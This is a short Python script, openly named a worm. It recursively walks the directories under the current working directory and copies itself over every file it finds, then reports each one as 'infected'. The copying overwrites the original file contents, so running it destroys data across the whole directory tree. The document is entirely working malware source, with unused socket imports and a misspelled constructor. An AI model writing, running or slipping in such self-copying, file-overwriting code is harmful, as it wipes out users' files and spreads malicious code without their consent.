import os
import sys
import shutil
import time
import socketserver
import socket
import optparse

directories = []
filename = sys.argv[0]

# Beginning worm_drive function.
class worm_drive:
    def __init(self):
        pass
    def filtering_and_expanding(self, path):
        for sub_dirs in os.listdir(path):
            if not sub_dirs.startswith('.') and not sub_dirs.startswith(str(filename)):
                directories.append(path + '/' + sub_dirs)

    def copies(self, path):
        try:
            destination = path
            shutil.copy(filename, destination)
        except Exception as e:
            print(e)

    def starting(self):
        self.filtering_and_expanding(os.getcwd())


    def initialiting(self):
        for i in directories:
            if os.path.isdir(i):
                available_directories = i
                self.filtering_and_expanding(available_directories)
            if os.path.isfile(i):
                self.copies(i)


    def worm_spreading(self):
        self.initialiting()
        for i in directories:
            try:
                print('[+] Successfully infected file or directory: ' + i)
                time.sleep(1)
            except Exception as e:
                print('[-] file infection failed on ' + i + " reason is " + str(e))
                time.sleep(1)
#comment
w = worm_drive()

w.starting()
w.worm_spreading()
